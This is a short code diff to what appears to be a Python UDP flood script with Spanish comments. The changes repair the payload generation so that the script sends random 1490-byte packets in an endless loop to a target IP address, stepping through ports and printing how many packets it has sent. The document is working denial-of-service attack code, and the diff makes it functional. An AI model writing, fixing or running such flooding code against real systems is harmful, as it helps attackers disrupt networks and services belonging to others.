@@ -15,7 +15,7 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random.random(1490)
+attack_bytes = bytearray(random.getrandbits(8) for _ in range(1490))
 #############
 
 # Definir variables de color
@@ -79,7 +79,7 @@ time.sleep(3)
 sent = 0
 try:
     while True:
-        sock.sendto(bytes, (ip, port))
+        sock.sendto(attack_bytes, (ip, port))
         sent = sent + 1
         port = port + 1
         print("Sent %s packet to %s through port:%s" % (sent, ip, port))
